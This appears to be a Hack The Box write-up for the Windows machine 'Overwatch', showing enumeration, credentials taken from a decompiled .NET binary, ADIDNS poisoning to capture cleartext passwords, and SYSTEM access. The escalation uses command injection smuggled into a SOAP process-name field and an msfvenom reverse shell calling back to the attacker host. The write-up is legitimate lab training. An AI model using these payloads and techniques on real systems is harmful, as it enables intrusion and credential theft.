---
layout: post
title: "HTB Machine - Overwatch"
date: 2026-05-17
permalink: /overwatch
excerpt: Overwatch is pretty straightforward and evolves around attacking a simple .NET monitoring application. It starts with finding a .NET binary in an open SMB share, decompiling it gives credentials to access MSSQL. There’s a linked server configured but it points to a non-existing host, I’ll perform ADIDNS poisoning to capture another set of credentials, which can be used to get a shell via WinRM. From here, I’ll discover the monitoring app running locally with admin privileges, and identify from the decompiled source code that it’s vulnerable to OS command injection.
tags: [HTB, Windows, Medium]
topics: [.net, reversing, dotpeek, impacket-mssqlclient, mssql, mssql linked servers, adidns poisoning, bloodyad, responder, port forwarding, chisel, soap, os command injection, msfvenom]
icon: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/533c1547f3f17ead6917b25782664de1.png
---
## Summary:
{{ page.excerpt }}

---
## Enumeration:
### Nmap:
{% capture nmap_short %}
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 12:39 ACDT
Nmap scan report for 10.129.188.76
Host is up (0.11s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
6520/tcp  open  unknown
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
50405/tcp open  unknown
50406/tcp open  unknown
52613/tcp open  unknown
52680/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 167.85 seconds
{% endcapture %}

{% capture nmap_long %}
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 12:44 ACDT
Nmap scan report for 10.129.188.76
Host is up (0.11s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-25 02:14:35Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-25T02:16:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-25T02:15:28+00:00
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
6520/tcp  open     ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.188.76:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ms-sql-ntlm-info: 
|   10.129.188.76:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-01-25T02:16:09+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-25T02:10:28
|_Not valid after:  2056-01-25T02:10:28
9389/tcp  open     mc-nmf        .NET Message Framing
49664/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
50405/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
50406/tcp open     msrpc         Microsoft Windows RPC
52613/tcp open     msrpc         Microsoft Windows RPC
52680/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-25T02:15:32
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   114.76 ms 10.10.14.1
2   113.68 ms 10.129.188.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.70 seconds
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="sudo nmap --min-rate 1000 -p- 10.129.188.76" output=nmap_short -%}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="sudo nmap -A -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49668,50405,50406,52613,52680 10.129.188.76" output=nmap_long -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

The box is a domain controller for the `overwatch.htb` domain. Interestingly, the host name is an unusual `S200401` instead of the standard `DC` or `DC01`. MSSQL is also running on a non-default port 6520. I’ll add the domain and host names to `/etc/hosts`.
```bash
# HTB machine Overwatch
10.129.255.36   overwatch.htb   s200401.overwatch.htb
```

### TCP445 - SMB:

Guest access is enabled, with a readable `software$` share.

{% capture out %}
SMB         10.129.188.76   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:False) 
SMB         10.129.188.76   445    S200401          [+] overwatch.htb\Anonymous: (Guest)
SMB         10.129.188.76   445    S200401          [*] Enumerated shares
SMB         10.129.188.76   445    S200401          Share           Permissions     Remark
SMB         10.129.188.76   445    S200401          -----           -----------     ------
SMB         10.129.188.76   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.188.76   445    S200401          C$                              Default share
SMB         10.129.188.76   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.188.76   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.188.76   445    S200401          software$       READ            
SMB         10.129.188.76   445    S200401          SYSVOL                          Logon server share
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="netexec smb overwatch.htb -u 'Anonymous' -p '' --shares" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

Inside the share is a single folder called `Monitoring`:

{% capture out1 %}
Password for [WORKGROUP\ch3ng]:
Try "help" to get a list of possible commands.
{% endcapture %}

{% capture out2 %}
&nbsp;
  .                                  DH        0  Sat May 17 10:57:07 2025
  ..                                DHS        0  Thu Jan  1 17:16:47 2026
  Monitoring                         DH        0  Sat May 17 11:02:43 2025

		7147007 blocks of size 4096. 981413 blocks available
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="smbclient \\\\overwatch.htb\\software$" output=out1 -%}
{%- include cmd.html type="custom" path="smb: \>" command="dir" output=out2 -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

It contains an executable and a bunch of related DLLs and config files. I’ll download all of them.

{% capture out2 %}
&nbsp;
  .                                  DH        0  Sat May 17 11:02:43 2025
  ..                                 DH        0  Sat May 17 10:57:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 06:08:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 06:08:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 06:08:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 06:08:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Tue Jul 18 00:16:10 2017
  overwatch.exe                      AH     9728  Sat May 17 10:49:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 10:32:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 10:49:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 06:11:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 06:10:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 06:10:42 2024
  System.Data.SQLite.xml             AH  1245480  Sun Sep 29 04:18:00 2024
  System.Management.Automation.dll     AH   360448  Tue Jul 18 00:16:10 2017
  System.Management.Automation.xml     AH  7145771  Tue Jul 18 00:16:10 2017
  x64                                DH        0  Sat May 17 11:02:33 2025
  x86                                DH        0  Sat May 17 11:02:33 2025

		7147007 blocks of size 4096. 980913 blocks available
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="custom" path="smb: \Monitoring\>" command="dir" output=out2 -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

`overwatch.pdb` is a debuf file for the executable. Running `strings` on it reveals several references to the source code, which appears to be located in `Administrator`'s home directory. Seems like the executable is running with admin privileges on the box, any exploitation on it would likely result in privilege escalation.

{% capture out %}
Microsoft C/C++ MSF 7.00
?AC# - 4.13.0-3.25167.3+73eff2b5de2ad38ec602c0a9e82f9125fb85992b
BZy,G
C:\Users\Administrator\source\repos\overwatch\overwatch\MonitoringService.cs
c:\users\administrator\source\repos\overwatch\overwatch\monitoringservice.cs
C:\Users\Administrator\source\repos\overwatch\overwatch\Program.cs
c:\users\administrator\source\repos\overwatch\overwatch\program.cs
C:\Users\Administrator\source\repos\overwatch\overwatch\IMonitoringService.cs
c:\users\administrator\source\repos\overwatch\overwatch\imonitoringservice.cs
C:\Users\Administrator\source\repos\overwatch\overwatch\obj\x64\Release\.NETFramework,Version=v4.7.2.AssemblyAttributes.cs
c:\users\administrator\source\repos\overwatch\overwatch\obj\x64\release\.netframework,version=v4.7.2.assemblyattributes.cs
C:\Users\Administrator\source\repos\overwatch\overwatch\Properties\AssemblyInfo.cs
c:\users\administrator\source\repos\overwatch\overwatch\properties\assemblyinfo.cs
Main
USystem
USystem.ServiceModel
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="strings overwatch.pdb" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

In `overwatch.exe.config`, the base address is listed as `http://overwatch.htb:8000/MonitorService`. Nmap did not find port 8000 open, so this is likely only locally accessible.
```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <serviceMetadata httpGetEnabled="True" />
          <serviceDebug includeExceptionDetailInFaults="True" />
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel>
  <entityFramework>
    <providers>
      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />
      <provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" />
    </providers>
  </entityFramework>
  <system.data>
    <DbProviderFactories>
      <remove invariant="System.Data.SQLite.EF6" />
      <add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6" />
    <remove invariant="System.Data.SQLite" /><add name="SQLite Data Provider" invariant="System.Data.SQLite" description=".NET Framework Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite" /></DbProviderFactories>
  </system.data>
</configuration>
```
<br>

For `overwatch.exe`, I’ll decompile it with [DotPeek](https://www.jetbrains.com/decompiler/). Immediately, I noticed the SQL connection string in `Program.cs`:

![](https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/overwatch/dotpeek_main.png)

The creds can be used to access MSSQL on port 6520:

{% capture out %}
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="impacket-mssqlclient -port 6520 overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.255.36 -windows-auth" output=out -%}
{%- include cmd.html type="custom" path="SQL (OVERWATCH\sqlsvc guest@master)>" output="" -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

### TCP6520 - MSSQL:

There’s one non-default database: `overwatch`.

{% capture out %}
name        
---------   
master      

tempdb      

model       

msdb        

overwatch
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="custom" path="SQL (OVERWATCH\sqlsvc guest@master)>" command="select name from sys.databases;" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

It has a single table called `Eventlog`, but it’s empty.

{% capture out1 %}
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
overwatch       dbo            Eventlog     b'BASE TABLE'   
{% endcapture %}

{% capture out2 %}
Id   Timestamp   EventType   Details   
--   ---------   ---------   -------
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="custom" path="SQL (OVERWATCH\sqlsvc guest@master)>" command="select * from overwatch.information_schema.tables;" output=out1 -%}
{%- include cmd.html type="custom" path="SQL (OVERWATCH\sqlsvc guest@master)>" command="select * from overwatch.dbo.Eventlog;" output=out2 -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

`xp_cmdshell` is disabled, and there’s no permissions to impersonate other users either. However, there’s a linked server on `SQL07`:

{% capture out %}
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      

SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="custom" path="SQL (OVERWATCH\sqlsvc guest@master)>" command="exec sp_linkedservers;" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

I’ve dealt with linked servers before in [Ghost](/ghost#mssql-linked-servers). Basically it enables connecting external data sources and executing queries on the remote hosts. The permissions can be different on each of them, which can often be abused if misconfigured.

I tried running queries on the remote server, but failed.

{% capture out %}
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="custom" path="SQL (OVERWATCH\sqlsvc guest@master)>" command="exec ('select @@version') at [SQL07];" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

It timed out and couldn’t connect. `SQL07` probably doesn’t even exist.

---
## Foothold:
### ADIDNS Poisoning:

This was also covered in [Ghost](/ghost#adidns-poisoning). By default, all domain users can add DNS entries as long as they don’t already exist. Since MSSQL is linked to a non-existing host `SQL07`, I could possibly coerce the box to authenticate to me by creating a new DNS entry for `SQL07` pointing to myself and then attempting to execute SQL queries on the linked server.

I’ll first start up `responder`:

{% capture out %}
&nbsp;
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
..SNIP..

[+] Listening for events...

[!] Error starting UDP server on port 53, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="sudo responder -I tun0" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

And then add a DNS record for `SQL07` pointing to myself, which was successful.

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="bloodyAD --host s200401.overwatch.htb -d overwatch.htb -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' add dnsRecord sql07 10.10.14.12" output="[+] sql07 has been successfully added" -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

I’ll run the same query on the linked server again. Obviously it failed but with a different error this time.

{% capture out %}
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="custom" path="SQL (OVERWATCH\sqlsvc guest@master)>" command="exec ('select @@version') at [SQL07];" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

On Responder, a cleartext password for `sqlmgmt` was captured.

{% capture out %}
[MSSQL] Cleartext Client   : 10.129.225.53
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
{% endcapture %}

{% include terminal.html title="Kali" inner=out %}

And it can be used to get a shell with WinRM.

{% capture out %}
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="evil-winrm -i overwatch.htb -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'" output=out -%}
{%- include cmd.html type="win" path="*Evil-WinRM* PS C:\Users\sqlmgmt\Documents" command="whoami" output="overwatch\sqlmgmt" -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

User Flag:

{% capture terminal %}
{%- include cmd.html type="win" path="*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop" command="type user.txt" output="f22deb71************************" -%}
{% endcapture %}

{% include terminal.html theme="blue" title="S200401" inner=terminal %}

---
## Escalation from `sqlmgmt`:
### Port 8000:

Port 8000 is listening. This is likely related to the executable seen earlier.

{% capture out %}
&nbsp;
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       372
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:6520           0.0.0.0:0              LISTENING       2528
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2852
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       676
..SNIP..
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="win" path="*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop" command="netstat -ano | findstr LISTENING" output=out -%}
{% endcapture %}

{% include terminal.html theme="blue" title="S200401" inner=terminal %}

I’ll set up port forwarding with [chisel](https://github.com/jpillora/chisel). I’ll first start the server on my host:

{% capture out %}
2026/01/31 01:33:09 server: Reverse tunnelling enabled
2026/01/31 01:33:09 server: Fingerprint Gml8XVY2oIm/g+BVt5W4iAPaQBRiAk+zJpax8Itba5Q=
2026/01/31 01:33:09 server: Listening on http://0.0.0.0:5000
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="./chisel_1.11.3_linux_amd64 server -p 5000 --reverse" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

And then connect to it from the box.

{% capture out %}
2026/01/30 07:17:10 client: Connecting to ws://10.10.14.12:5000
2026/01/30 07:17:13 client: Connected (Latency 378.5191ms)
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="win" path="C:\Users\sqlmgmt\Desktop" command=".\chisel.exe client 10.10.14.12:5000 R:8000:localhost:8000" output=out -%}
{% endcapture %}

{% include terminal.html theme="blue" title="S200401" inner=terminal %}

Now the service is accessible from my Kali on port 8000.

![](https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/overwatch/soap_home.png)

The WSDL schema can be viewed with the `?singleWsdl` parameter.

![](https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/overwatch/soap_singlewsdl.png)

There’s 3 operations: `StartMonitoring`, `StopMonitoring` and `KillProcess`. Only `KillProcess` takes parameters. Their implementations can also be found in the decompiled source code earlier.

![](https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/overwatch/dotpeek_monitorservice.png)

`KillProcess` is vulnerable to OS command injection, in particular this line:
```csharp
string scriptContents = "Stop-Process -Name " + processName + " -Force";
```

### OS Command Injection:

SOAP requests (and XML in general) can be quite disgusting to deal with. I’ll use [this page](https://www.kloudbean.com/soap-request-generator/) to generate the POST data for me.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://tempuri.org/" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <soap:Header>
    <Action>http://tempuri.org/IMonitoringService/KillProcess</Action>
  </soap:Header>
  <soap:Body>
    <ns:KillProcess>
      <ns:processName>asdf; echo pwned > c:\pwned.txt;</ns:processName>
    </ns:KillProcess>
  </soap:Body>
</soap:Envelope>
```
<br>

The payload attempts a basic injection to create `pwned.txt` in the root directory. When sent, it threw an error:

{% capture cmd %}curl -X POST http://localhost:8000/MonitorService -H 'Content-Type: text/xml' -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' -d "$(cat payload.txt)"{% endcapture %}

{% capture out %}
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>Error: The term '-Force' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.</KillProcessResult></KillProcessResponse></s:Body></s:Envelope>
{% endcapture %}

{% capture cmdescape %}
{{- cmd | escape -}}
{% endcapture %}

{% capture outescape %}
{{- out | escape -}}
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command=cmdescape output=outescape -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

However, the file was created, indicating the command injection was successful.

{% capture cmd %}dir c:\{% endcapture %}

{% capture out %}
&nbsp;
    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/16/2025   4:35 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         5/16/2025   8:11 PM                Program Files
d-----         5/16/2025   5:35 PM                Program Files (x86)
d-----         5/16/2025   5:30 PM                SQL2022
d-r---         5/16/2025   8:08 PM                Users
d-----        12/31/2025  11:17 PM                Windows
-a----         1/30/2026   8:44 AM             16 pwned.txt
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="win" path="*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop" command=cmd output=out -%}
{% endcapture %}

{% include terminal.html theme="blue" title="S200401" inner=terminal %}

For the shell, I’ll generate a payload with `msfvenom`.

{% capture out %}
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=8001 -f exe -o shell.exe" output=out -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

Then I’ll upload it with `evil-winrm` and trigger its execution via another SOAP payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://tempuri.org/" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <soap:Header>
    <Action>http://tempuri.org/IMonitoringService/KillProcess</Action>
  </soap:Header>
  <soap:Body>
    <ns:KillProcess>
      <ns:processName>asdf; c:\users\sqlmgmt\desktop\shell.exe;</ns:processName>
    </ns:KillProcess>
  </soap:Body>
</soap:Envelope>
```
<br>

It threw an error again when I send the payload, but a SYSTEM shell was sent back.

{% capture out %}
listening on [any] 8001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.129.225.53] 54498
Microsoft Windows [Version 10.0.20348.4648]
(c) Microsoft Corporation. All rights reserved.
{% endcapture %}

{% capture terminal %}
{%- include cmd.html type="kali" path="~/machines/overwatch" command="rlwrap nc -lvnp 8001" output=out -%}
{%- include cmd.html type="win" path="C:\Software\Monitoring" command="whoami" output="nt authority\system" -%}
{% endcapture %}

{% include terminal.html title="Kali" inner=terminal %}

### Root Flag:

{% capture terminal %}
{%- include cmd.html type="win" path="C:\Users\Administrator\Desktop" command="type root.txt" output="6b2f1cac************************" -%}
{% endcapture %}

{% include terminal.html theme="blue" title="S200401" inner=terminal %}

---